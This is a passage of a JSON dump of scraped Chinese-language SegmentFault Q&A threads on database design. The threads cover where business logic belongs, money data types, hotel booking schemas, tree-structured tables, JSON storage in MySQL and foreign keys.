      "dsc": "<div class=\"question fmt\" data-id=\"1010000002619005\">\n<p>SQL应该负责怎么样的CURD，分组、排序、可能根据业务逻辑只是选择性查个别字段、使用SQL函数等等让不让数据库做？还是自己用编程语言（比如java、c++）写的应用程序里处理数据？</p>\n<p>实例：统计2015-03-22 ~ 2015-03-24期间全国每个城市/省份每天的访问ip量。<br>\n假设查询涉及的表的数据量为S。考虑以下三种方式。<br><strong>做法一：</strong><br>\n在一个以天为步进单位长度来遍历2015-03-22 ~ 2015-03-24日期范围以及全国每个城市的循环里，执行countIp(visitDay, cityCode)统计某个城市或省份某天的ip量。核心SQL：</br></br></br></p>\n<pre><code>SELECT COUNT(DISTINCT user_ip) FROM pv_access  WHERE visit_date_time BETWEEN {某天最早时间点} AND {某天最晚时间点} AND city_code = {某个城市的编码}\n\nSELECT COUNT(DISTINCT user_ip) FROM pv_access  WHERE visit_date_time BETWEEN {某天最早时间点} AND {某天最晚时间点} AND city_code LIKE {模糊匹配某个省的所有城市}\n</code></pre>\n<p><strong>做法二：通过以下SQL获取数据，然后在应用程序中做分组统计。</strong></p>\n<pre><code>SELECT visit_date_time, city_code, user_ip  FROM pv_access  WHERE visit_date_time BETWEEN '2015-03-22 00:00:00' AND '2015-03-24 23:59:59' AND city_code in ({所有城市的编码})\n</code></pre>\n<p><strong>如果没有统计省份的需求，有第三种做法，直接执行SQL按【天+城市】分组统计：</strong></p>\n<pre><code>SELECT DATE_FORMAT(visit_date_time,\"%Y-%m-%d\") as day, city_code, ipCount FROM pv_access  WHERE visit_date_time BETWEEN '2015-03-22 00:00:00' AND '2015-03-24 23:59:59' AND city_code in ({所有城市的编码}) GROUP BY DATE_FORMAT(visit_date_time,\"%Y-%m-%d\"), city_code;\n</code></pre>\n<p><strong>我自己的分析：</strong></p>\n<ol>\n<li>涉及循环n次访问数据库，每次取一个分组的统计结果，时间复杂度为(nS)。优点应该是易于维护。</li>\n<li>数据库负责简单的查出记录集，不负责统计，一次性取出统计所需的所有数据，然后让应用程序做分组统计等处理。但是这样不就增加了传输量吗？因为可能我们需要的最终结果只是一个统计值（比如这个例子），但为了将统计工作转移到应用程序，就必须传输更多的数据。传输量为（S）。</li>\n<li>\n<p>一条SQL语句获取最终结果则只需一次请求，时间复杂度为(S)。但压力大部分会转移到数据库？</p>\n<p>如果涉及分组统计，而分组不是互斥的（上面的例子【天+地区】分组不是互斥，既有城市又有省份），那么应该无法使用直接用SQL实现分组统计得到最终结果，是吧？这个时候只能通过自身应用程序实现分组统计？</p>\n</li>\n</ol>\n<p>我想我上面的问题的本质问题是：<br><strong>两个可互相通讯并对外提供服务的程序各自应该负担什么工作，业务逻辑放在哪，放多少？</strong><br>\n希望各位有经验有见解的童鞋给我指点迷津。</br></br></p>\n</div>",
      "favourite": "2",
      "glance": "1.6k",
      "tags": [
        "数据库",
        "java"
      ],
      "time": "2015-03-24",
      "title": "业务逻辑写在数据库还是自身应用程序？",
      "url": "https://segmentfault.com/q/1010000002619005"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002991122\">\n<p>一般用decimal</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002991235\">\n<p>decimal 比较合理一点</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002991509\">\n<p>压箱底的文章。为什么不用浮点数，而是使用 <code>decimal</code>：</p>\n<ul>\n<li><a href=\"http://justjavac.com/codepuzzle/2012/11/02/codepuzzle-float-from-surprised-to-ponder.html\" rel=\"nofollow\">代码之谜（四）- 浮点数（从惊讶到思考）</a></li>\n<li><a href=\"http://justjavac.com/codepuzzle/2012/11/11/codepuzzle-float-who-stole-your-accuracy.html\" rel=\"nofollow\">代码之谜（五）- 浮点数（谁偷了你的精度？）</a></li>\n</ul>\n<blockquote>\n<p>如果采用 <code>int</code> 我的计算比较准确</p>\n</blockquote>\n<p>你的逻辑是不是这样：<code>int</code> 是定点数，比较准确。</p>\n<p>但是 <code>decimal</code> 也是定点数，<code>decimal</code> 虽然是小数，但是不是浮点数，因此 <code>decimal</code> 和 <code>int</code> 的准确度是一样的。</p>\n<blockquote>\n<p>只需要显示的时候把结果缩小 2 位即可，例如 <code>300</code> 就是 <code>3</code> 块钱、<code>20</code> 就是 <code>2</code>毛钱。</p>\n</blockquote>\n<p>缩小2位。怎么缩写？除以10？还是变成字符串，左移？</p>\n<p>你不觉得麻烦吗？</p>\n<blockquote>\n<p>但是如果采用 <code>decimal</code>，一个是传递参数麻烦，二个是有计算误差，三是性能问题。</p>\n</blockquote>\n<ol>\n<li><p><code>decimal</code> 就是小数，定点小数。所以，传递参数肯定不麻烦。（不知道你使用什么语言？）</p></li>\n<li><p><code>decimal</code> 在所有的表示范围内，都可以精确表示出来。不会像浮点数一样存在误差。</p></li>\n<li><p>比起你自己反复的乘以10，除以10， <code>decimal</code> 的性能还是比你的高。</p></li>\n</ol>\n<p>再次推荐我写的那2篇文章，破除对<strong>小数</strong>、<strong>定点数</strong>、<strong>浮点数</strong>的误解。</p>\n</div>",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002991081\">\n<p>数据库中在设计金钱的时候，是选择int类型好 还是decimail</p>\n<p>我的业务场景是 金钱到小数点后2位 比如12.11<br>\n如果采用int 我的计算比较准确 只需要显示的时候把结果缩小2位即可 例如 300 就是3块钱、20 就是2毛钱<br>\n但是如果采用decimail 一个是传递参数麻烦 二个是有计算误差 三是性能问题</br></br></p>\n<p>请有相关金钱计算设计的人，帮忙回答下，谢谢啦~~</p>\n</div>",
      "favourite": "4",
      "glance": "1.4k",
      "tags": [
        "数据库",
        "数据类型"
      ],
      "time": "2015-07-15",
      "title": "数据库中 金钱 数据类型",
      "url": "https://segmentfault.com/q/1010000002991081"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005624529\">\n<p>对于mysql的查询，请问是IO复用，线程池，进程池中的哪种模型？或者是其他模型？可以配置吗？</p>\n</div>",
      "favourite": "2",
      "glance": "224",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "6-2",
      "title": "mysql数据库每次查询是一条线程吗？",
      "url": "https://segmentfault.com/q/1010000005624529"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096479\">\n<p>关于客房时间的判断能否这样考虑一下：</p><p>现在酒店一般是中午或者下午1、2点退房（<strong>单位为天</strong>）。按国家规定入住时间：14:00－次日12:00为一个入住周，回忆自己的亲身经历，入住的时候并没有问具体的<strong>离店时间</strong>，只是问<strong>离店日期</strong>，那么就不需要用左、右两个时间来判断期间了。</p><p>整个过程整理如下：</p><ol><li>用户入住(早于、晚于12点都有可能)，查找状态为空的客房；</li><li>用户退房(早于、晚于12点都有可能，不过一般应为早于十二点)，将客房状态置空。</li></ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096495\">\n<p>考虑一下，由于房间这个实体的数量，类型相对固定，可以将房间视作一种资源。而订单则是对资源的申请，可以通过以往的申请和资源总量算出当前可支配的资源。因此，可以通过查询历史订单检验新订单是否合法。结合房间表和房间-订单连接表，即可完整实现业务逻辑。</p><p>数据库订单表</p><pre>id\t        int(11)\t\t\tAUTO_INCREMENT\t \t \t \t \t \t \t\ntime_start\tint(11)\t\t\t\t \t \t \t \t \t \t\ntime_days\ttinyint(5)\ntype_room       tinyint(3)\t\t\t\t \t \t \t \t \t \t\nstatus\t        tinyint(3)</pre><p>数据：</p><pre>id\ttime_start\ttime_days\tstatus\n1\t20110625\t3\t        1\n2\t20110626\t2\t        1\n3\t20110627\t3\t        1\n4\t20110625\t1\t        1\n5\t20110625\t2\t        1\n6\t20110624\t1\t        1\n7\t20110624\t2\t        1</pre><p>查询所有预定20110626日类型为2的房间的订单</p><pre>mysql&gt; select * from room_orders where time_start&lt;20110626 and (time_start+time_\ndays&gt;=20110626) and type_room=2;</pre><p>每日房间的预定情况是一个热查询，特别是今天、明天、后天等的预定情况，可以考虑将结果缓存。<br/>\n如果有新订单提交校验，则对次查询做 count，即可算出某天被预定的2型房间总数。由于该类型的房间总数已知，减法操作即可算出某天某型房间有多少空余。一般情况，预定天数较小，依次count即可算出预定的时间区间是否有足够空房。</p><p>这个设计的缺点是查询较多，可以考虑使用文件缓存。另外，可以考虑将未来几天的空余房间信息做缓存，每次更新订单表时更新一次。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096474\">\n<p>拍拍脑袋想，貌似用sql查询满足不了下单流程的需求。<br/>\n这个房间订单，是离散的区间集合，而下单所需要的查询是对这些离散区间取反进行查询。关系库搞不定这种查询。<br/>\n针对这种离散区间的数据结构，房价表中room_order_start，room_order_end两个字段就没必要了，可以干掉。<br/>\n其实就按照这样的设计，用多条查询也能满足下单需求，只是很不优雅：遍历房间表，一个一个的看房间是否满足下单条件。<br/>\n如果优雅一点，在内存里给每一个房间做索引，每次下单去内存里进行匹配（匹配过程也是个遍历，只是索引在内存里，而且可以直接定位房间号，效率不是那么低）。<br/>\n另外：还需要一张房间类型表吧？这样你可以配置房间类型什么的。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094656\">\n<p>酒店有若干房间，房间有若干类型。<br/>\n给定房间数和一个时间区间（以天为单位），给定房间类型。查询数据库当前状态，如果满足订房条件则产生订单，否则返回false。如果返回false时能给出合理的订房建议则更佳。</p><p>我考虑的方案：<br/>\n---------------------------------------------------------------</p><p>房间表:<br/>\nroom_id<br/>\nroom_type                 房间类型<br/>\nroom_status               房间状态[是否空置]<br/>\nroom_order_id             order表外键，被那个订单预定<br/>\nroom_order_start          时间区间左标<br/>\nroom_order_end            时间区间右标<br/>\n...</p><p>订单表：<br/>\norder_id<br/>\norder_rooms               预定的房间总数<br/>\norder_room_type           预定的房间类型<br/>\norder_start               预定区间左标<br/>\norder_end                 预定区间右标<br/>\n...</p><p>下订单的流程<br/>\n从房间表找未预定的或者预定区间同用户选择区间不重叠的房间，如果符合条件的房间总数小于用户选择的房间数，返回false，否则返回true。</p><p>问题与疑惑<br/>\n-----------------------------------------------------------------<br/>\n这种设想没有整合房间资源，例如A、B房间均被预定且都在新订单选择的时间区内，都不符合查询条件。但是A、B<br/>\n综合起来是满足时间区间的，A退房之后原来的B可以使用A房间。<br/>\n个人感觉这个很类似内存管理的算法，用有限的房间类型和房间数来满足无限多的客人入住。本人才疏学浅，请各位<br/>\n多指教。</p>\n</div>",
      "favourite": "0",
      "glance": "5.2k",
      "tags": [
        "数据库"
      ],
      "time": "2011-06-23",
      "title": "关于酒店订房系统的数据库设计",
      "url": "https://segmentfault.com/q/1010000000094656"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"\">\n</div>",
      "favourite": "5",
      "glance": "107",
      "tags": [],
      "time": "1970-01-01",
      "title": "",
      "url": "https://segmentfault.com/q/1010000000094700"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095207\">\n<p>看到过一些技术文章的介绍，但是对一些技术细节都没有很好的解释。比如说现在时间线有两种设计模式，一种是推，一种是拉。</p><p>推的方式比较省读取时间，也就是说你发一条微博就就会把你的这条信息推送到你所有粉丝的节点上。我的疑问是</p><ol><li>这样会不会太慢了，很多明星会员都有几百万的粉丝，而他们又喜欢刷屏，比如苍老湿。那这样发送系统受得了吗。</li><li>当我们unfollow一个用户的时候，怎么把这些用户关联的信息从我们的收听节点删掉呢，一条一条过滤吗是不是太慢了</li></ol><p>拉的方式比较省写入时间，反正你要写的就是你自己的节点。但我很怀疑这种实现是否现实，最大的就是读取速度的问题，在现有数据库系统下我还没有找到一种合适的结构来让读取更加快速，除非有一种特殊的数据库来解决这个问题。比如说现在兴起一种图数据库，据说很适合解决sns里面的关系问题，不知道能否解决这个问题。</p>\n</div>",
      "favourite": "5",
      "glance": "5.1k",
      "tags": [
        "数据库",
        "微博",
        "sns"
      ],
      "time": "2011-12-02",
      "title": "微博中的时间线功能应该怎么设计数据结构",
      "url": "https://segmentfault.com/q/1010000000095207"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000126520\">\n<p>你找到的这篇文章即是yegle提到的Modified Preorder Tree。<br/>\n我在2006年实践过，它的优点是查询非常高效，缺点是理解起来不那么直观，写操作麻烦。</p><p>当年，我在小白板上跟@joyqi等人举例讲这个结构，讲左右值的时候讲不下去了，后来joyqi发明了他的星际算法，即为每个元素定义(x,y)值，x表示往右的偏移，y表示往下的偏移，整个树的根结点是(0,0)。这种树结构最大的优点是理解非常直观（想象一下windows资源管理器左侧的目录树），非常适合网页前端的树形展示（类目树，评论嵌套）。缺点也是明显的，那就是在SQL的层面，无法像Modified Preorder Tree一样一条语句搞定所有子节点查询和族谱查询，需要有专门的API来操纵它，我们在kiwiphp里专门写了一个DbTableTree Class来实现树结构的维护，后来由于实用性的缘故慢慢放弃了，使用最老套的parent_node/root node的方式了。</p><p>ps:当年joyqi没毕业，还是实习生，就有这样独特的思路并运用到商业产品中，思考能力和工程能力可见一斑。</p><p>所以，我的结论是：</p><ol><li>最常用，写操作最简单的就是node_id, parent_node_id这种结构，如果业务限定了树结构的变化频度，可适当加一些root_node_id, parent_path之类的冗余字段提升性能，降低查询编码复杂度</li><li>Modified Preorder Tree是优秀的树结构设计了，它有效地消除了上面这种算法在查询所有子节点和族谱路径时的递归，只是写操作会麻烦很多很多。这似乎是不可调和的，凡是消除了递归的，好像写操作都会很麻烦。</li><li>不明白binary tree怎么让你郁闷了。实在不喜欢binary tree，可以自己根据Modified Preorder Tree的精要设计一个“每个节点可以拥有大于2个子节点”的树结构，就像B-Tree,四叉最小堆</li></ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000126392\">\n<p>建议参考树的 左孩子右兄弟 的表示方法，可以为每个节点保存一个孩子一个兄弟</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000126467\">\n<p>使用Modified Preorder Tree简直是必须的。网上可以搜一下modified preorder tree travesal找到相关资料。参考 <a href=\"http://www.sitepoint.com/hierarchical-data-database-2/\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.sitepoint.com/hierarchical...\">http://www.sitepoint.com/hierarchical...</a></p><p>至于你说的binary tree和general tree的问题，这是个树的基本操作了，互相转换问题不大。参考 <a href=\"http://en.wikipedia.org/wiki/Binary_tree#Encoding_general_trees_as_binary_trees\" rel=\"nofollow\" target=\"_blank\" title=\"http://en.wikipedia.org/wiki/Binary_t...\">http://en.wikipedia.org/wiki/Binary_t...</a></p><p>----------------------</p><p>好吧我忘了提一个很dirty的方法。</p><p>如果你的树深度是可预期的话，有个超简单的数据结构。你需要3个字段来表达这个树：</p><ol><li>id，本节点的primary key</li><li>parent_id，其值为父节点的primary key</li><li>key，忘了学名叫啥了，你可以称为线索</li><li>level，表示当前节点到根节点的距离</li></ol><p>其中，key字段的值为：从跟节点到父节点的primary key，中间用任意非数字符号分割。</p><p>例如以下树状结构</p><pre>├── a\n│   ├── d\n│   │   ├── p\n│   │   ├── q\n│   │   └── r\n│   ├── e\n│   └── f\n├── b\n│   ├── x\n│   ├── y\n│   └── z\n├── c</pre><p>对应的数据库表值为：</p><pre>| id | value | parent_id | key   | level |                                \n| 1  | a     | 0         | \"-\"    | 1     |\n| 2  | b     | 0         | \"-\"    | 1     |\n| 3  | c     | 0         | \"-\"    | 2     |\n| 4  | d     | 1         | \"1-\"   | 2     |\n| 5  | e     | 1         | \"1-\"   | 2     |\n| 6  | f     | 1         | \"1-\"   | 2     |\n| 7  | x     | 2         | \"2-\"   | 2     |\n| 8  | y     | 2         | \"2-\"   | 2     |\n| 9  | z     | 2         | \"2-\"   | 2     |\n| 10 | p     | 4         | \"1-4-\" | 3     |\n| 11 | q     | 4         | \"1-4-\" | 3     |\n| 12 | r     | 4         | \"1-4-\" | 3     |</pre><p>于是，在给定一个节点d的时候，</p><ol><li>查找d的所有子孙节点：<code>select * from table_name where key like \"${d.key}-${d.id}-%\"</code></li><li>查找某个节点的所有子节点：<code>select * from table_name where key like \"${d.key}-${d.id}-%\" and level=${d.level}+1</code></li></ol><p>这个设计，结构非常简单。key和level是辅助字段，维护这两个字段成本很低，即使全部重建要比MPT简单多了。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000126370\">\n<p>这棵树（非二叉树）是这样的：</p><ul><li>有唯一根节点</li><li>每个节点只有一个父节点</li><li>每个节点有多个子节点</li></ul><p>现在我的表是这样的：</p><blockquote>node_id node_name parent_id</blockquote><p>但是这样的设计，在查询是很麻烦，很难快速的查找某个节点下所有子节点，或者查询这个节点的族谱路径，等等。</p><p>在网上找到了【<a href=\"http://blog.csdn.net/monkey_d_meng/article/details/6647488\" rel=\"nofollow\" target=\"_blank\" title=\"树形结构的数据库表Schema设计\">树形结构的数据库表Schema设计</a>】这篇文章，讲的很好，主要思想是为每个节点设置左右值。当时还以为是我要的，但是，后来发现这<strong>必须</strong>是一棵<strong>二叉树</strong>，最后还是让我郁闷了。</p><p>问题就是有没有更好的设计？</p>\n</div>",
      "favourite": "22",
      "glance": "16.1k",
      "tags": [
        "数据库",
        "数据库设计"
      ],
      "time": "2012-10-10",
      "title": "树状结构的数据表如何设计?",
      "url": "https://segmentfault.com/q/1010000000126370"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000129174\">\n<p>有50亿条商品名称信息，每条信息最长是50个字符，给定限制内存是4G，如何从这50亿条商品信息中查找出任意两条相同商品名称信息。给出思路以及算法思路。</p>\n</div>",
      "favourite": "5",
      "glance": "2.4k",
      "tags": [
        "数据库",
        "数据查询",
        "互联网招聘"
      ],
      "time": "2012-10-17",
      "title": "如何从大数据中找出两条相同的信息",
      "url": "https://segmentfault.com/q/1010000000129174"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000150722\">\n<p>如果服务端没有要求...node比较好点吧..</p><p>socket.io..多种方案,也支持多种浏览器</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000150733\">\n<p>到现在为止的成熟方案似乎包括tornado, node, erlang, 另外不知道go实现的怎么样, python里面还有一堆gevent, greenlet可以用, twisted也可以考虑. PHP多线程或多进程就别想了.</p><p>在产品级别, 已知的比如 www.quora.com 是tornado, gtalk不知道如何实现, 可能是java?<br/>\nmochimedia应该比较erlang<br/>\n国内的腾讯阿里什么的就更不知道了, 他们都有做web chat的, zhihu.com也是tornado</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000150704\">\n<p>这个需求跟在线聊天类似</p><ul><li>ajax频繁请求</li></ul><ul><li>长轮询</li></ul><p>可以看看这篇[文章](<a href=\"http://blog.leezhong.com/tech/2011/03/21/php-comet.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.leezhong.com/tech/2011/03...\">http://blog.leezhong.com/tech/2011/03...</a>)</p><ul><li>websocket (开源swf库可以解决低版本浏览器的兼容,swf需要服务器端的一个授权)</li></ul><p>swf开源库：[<a href=\"https://github.com/gimite/web-socket-js\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/gimite/web-socket-...\">https://github.com/gimite/web-socket-...</a>](<a href=\"https://github.com/gimite/web-socket-js\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/gimite/web-socket-...\">https://github.com/gimite/web-socket-...</a>)<br/>\n这里我写了段简单的服务器端授权[代码](<a href=\"https://github.com/xiaozi/PolicyServer/\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/xiaozi/PolicyServe...\">https://github.com/xiaozi/PolicyServe...</a>)</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000150643\">\n<p>比如，实现一块区域专门进行最新留言的展示.. 每次有最新的留言就把它显示在上面..<br/>\n(比如人人影视右下角的“精彩评论”, 不知道是不是实时的)</p><p>再比如，做一个网站，抓取其他网站上的信息，比如租房价格。<br/>\n但是其他网站上的租房价格的更新并不是定时的。</p><p>对于这些实时更新的需求? 有什么思路可以完成？</p>\n</div>",
      "favourite": "11",
      "glance": "3.1k",
      "tags": [
        "数据库",
        "php",
        "python"
      ],
      "time": "2012-12-11",
      "title": "实时数据更新有什么思路可以完成？",
      "url": "https://segmentfault.com/q/1010000000150643"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000175587\">\n<p>数据库 = PAYLOAD + INDEX<br/>\n以上不是公理, 却是更好的了解数据库的一个新视角</p><p>提问者的数据库设计方案, 有点类似大神Bret Taylor(FB ex-CTO)的一篇blog<br/>\n<a href=\"http://backchannel.org/blog/friendfeed-schemaless-mysql\" rel=\"nofollow\" target=\"_blank\" title=\"http://backchannel.org/blog/friendfee...\">http://backchannel.org/blog/friendfee...</a><br/>\n相信这种解决方法已经在frendfeed被验证过, 经得起考验</p><p>KV的编程的一条核心思想, 就是把那些需要query的东西, 变成已经存在的数据.<br/>\n比如用户发的所有帖子, 以前需要按照user_id查询, 现在我们把帖子id放到users表的json里面, 那么一句查询(依赖索引)就变成了n条k/v的get操作.(请灵活运用)</p><p>我自己也根据这个博客写过一些实现 <a href=\"https://github.com/kernel1983/NoMagic\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/kernel1983/NoMagic\">https://github.com/kernel1983/NoMagic</a> 并已经在生产环境使用了.</p><p>我的个人建议, 无需一开始就使用key/value数据库, 但是将mysql设计的可以轻易的用kv数据库代替, 以提高数据库PAYLOAD部分的吞吐能力. 而在INDEX部分, B Tree算法没有过时, mysql就不会过时.</p><p>对于mongodb的复杂算法和实现, 我更加倾向于memcachedb/redis这种一句话就可以讲清楚自己在做什么的数据库方案.</p><p>总之, 解决问题的思想无需被范式捆绑.<br/>\n多看一看别人怎么做的, 你的奇思妙想可能已经不是独一无二的了.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000175566\">\n<p>目前能想到的问题有两个：<br/>\n1、无法对这些数据进行排序</p><p>2、搜索好像不是很方便？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000175492\">\n<p>既然不需要索引，这种情况看起来用KeyValue库更合适一些，比如TC/TT, Bdb, Redis；或者MongoDb这种文档型数据库也可以（但也有很多设计上的坑）。</p><p>其他理由如下：<br/>\n1. Mysql库里慎用text字段，性能不乐观……<br/>\n2. 一旦需要对这些数据进行索引或者统计，从MySQL中解出所有的数据并重新入库成本相当巨大……<br/>\n3. 大JSON的parse性能同样不乐观，而且对于中文数据，纯JSON太占空间了……<br/>\n4. 100条/记录的存储方式，如果需要对其中一条进行增加/删除/更新，即需要更新整个100条，更新量比较大；同样可能会产生并发问题，需要自行实现行锁。</p><p>一般情况下，如果你用了关系数据库，不要轻易（为了性能/空间）做违反范式的设计，除非你有足够的理由和把握，否则会给未来的维护升级带来无尽的麻烦。</p><p>通常建议：<br/>\n1. 换Key-Value库/文档库(mangodb)<br/>\n2. 或者关系库做好缓存和索引优化，可以把一个用户相关的勋章称号都缓存在一个key下，这个是经过被各大网站验证过无数遍的设计……</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000175476\">\n<p>最近在设计一些复杂的 MySQL 数据库表。<br/>\n碰到一些需要存储<strong>用户所得成就</strong>、<strong>用户所得称号</strong>、<strong>用户消息</strong>之类的数据的需求。</p><p>感觉这类数据其实可以直接用 JSON 格式存储在 user_meta 表的 text 类型字段里。<br/>\n而不需要设计过于复杂的表。<br/>\n当然并不是所有数据都存储在一起，可能按照 100 条数据/条记录的方法。</p><p>优点是：</p><ul><li>每页显示 50 条用户数据的话，每页只要读一次数据库的一条记录就行了，而不需要遍历 50 条记录。</li><li>把数据库的压力分担到程序执行上，貌似更多情况是数据库压力过大导致网站挂掉。</li><li>不需要设计复杂的数据库表，因为这类数据的结构可能经常变动，用 JSON 可以在程序中做好处理。</li></ul><p>但是我不知道这样设计的缺点，因为我没有足够的经验。<br/>\n所以我的问题是：<br/>\n<strong>在关系型数据库中频繁使用 JSON 格式来存储不需要索引的数据好么？</strong><br/>\n<strong>或者有没有更好的方案呢？</strong></p><p>麻烦大家了，谢谢 =w=</p>\n</div>",
      "favourite": "8",
      "glance": "10.5k",
      "tags": [
        "数据库",
        "数据库设计",
        "关系型数据库",
        "mysql"
      ],
      "time": "2013-03-03",
      "title": "在关系型数据库中频繁使用 JSON 格式来存储不需要索引的数据好么？",
      "url": "https://segmentfault.com/q/1010000000175476"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000315351\">\n<p>性能上，不会有差别。</p>\n<p>另外，有一个差别，人。当维护者看到很多乱七八糟的表毫不负责任的堆砌在一起的时候，就会产生抵触情绪。开始对项目的维护也不负责任，然后后续的一系列发生的事情会将这两个项目马不停蹄的送进火葬场。\n为什么？详见《<a href=\"http://baike.baidu.com/view/298167.htm\" rel=\"nofollow\">破窗户理论</a>》</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000311443\">\n<p>这个简单啊，你写两个连接字符串，分辨处理不同KEY</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000315312\">\n<p>我觉得逻辑上区分才是更应该考虑的事情。<br/>\n数据库分开，备份、恢复方便，以后调优查看也方便，而且他们再逻辑上也是分离的。  </p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000311390\">\n<p>比如wordpress和discuz每个各自有一个数据库，但是用的是不同表</p>\n<p>和两者用不同数据库的性能有差别吗？</p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "数据库",
        "数据库性能优化"
      ],
      "time": "2013-09-23",
      "title": "两个程序共用一个数据库和两个程序分别用各自数据库性能差别如何？",
      "url": "https://segmentfault.com/q/1010000000311390"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000360110\">\n<p><strong><em>因为以前没有开发过复杂的网站，不太了解网站的维护应该如何进行，希望大家能指点。</em></strong><br/>\n<strong>SAE - PHP</strong></p>\n<p>1.例如网站目前是<strong>1.0版本</strong>，而我正在开发<strong>1.1版本</strong>。那我如何在不让网站用户察觉的情况下调试网站？因为我需要不断的 submit 新的版本，来检查自己的代码是否正确 (mac下没有SAE本地调试)</p>\n<p>2.如何开发后台？例如我是一个社交网站，我需要用管理员的帐号来删除一些不良信息。那是应该新开发一个网页还是直接在原网页的基础上判断用户是否是管理员，以此来显示管理员工具？</p>\n<p><strong>希望大家能够解答我的问题！谢谢！</strong></p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "sina-app-engine",
        "php",
        "前端",
        "安全",
        "数据库"
      ],
      "time": "2013-12-13",
      "title": "在 SAE 上如何维护网站？",
      "url": "https://segmentfault.com/q/1010000000360110"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000371595\">\n<html><body>\n<p>软件环境：Windows 7 英文版，时区UTC+8:00， <a href=\"http://www.enterprisedb.com/products-services-training/pgdownload#windows\" rel=\"nofollow\">PostgreSQL 9.3.2</a></p>\n<p>现象：启动pgsql的命令行就出现乱码，很奇怪。</p>\n<p>如图：<br><img data-src=\"http://segmentfault.com/img/bVbIPB\"/></br></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "数据库",
        "postgresql"
      ],
      "time": "2013-12-28",
      "title": "PostgreSQL 9.3 Win下乱码",
      "url": "https://segmentfault.com/q/1010000000371595"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000401903\">\n<ol>\n<li>作为写了8年<code>PHP</code>的程序员来讲， 我个人的习惯是不使用外键。</li>\n<li>因为我们所接触的绝大多数业务需求，并没有严谨到需要双层数据验证（第一层是在<code>PHP</code>代码里）。<br>\n即使是对数据一致性稍有要求的电子商务网站，我也接触过只用<code>MyISAM</code>表的，除了程序逻辑本身经过严格的单元测试和使用场景测试去保证数据一致性之外，我们还准备了完善的<code>logging</code>系统，在<code>pdo</code>层面对站点数据的每一次<code>CURD</code>做日志，针对管理员和会员的每一个操作也做日志，方便意外情况的随时排查。</br></li>\n<li>选型过程中没有使用<code>Innodb</code>的其它原因还包括：缓存的设计十分合理、命中率十分高，并且经过了数据验证，综合应用流量，我们可以大胆不去考虑锁表问题；外键确实增加了数据库开销，相对于我们站点的规模来讲，增加的开销无法忽略；绝大多数<code>PHP</code>或<code>Java</code>前端人员水平良莠不齐，我们不想为数据库基础不好的同学做科普。</li>\n<li>说句题外话，当一个应用需要考虑是否拿掉外键，提高效率的时候。需要重构代码或增加中间件（<code>mongo</code>, <code>redis</code>之类）以应付数据库开销了。</li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000401967\">\n<p>如果需要切分数据表到不同的数据库里面时，就不能使用外键作为约束了</p>\n</div>",
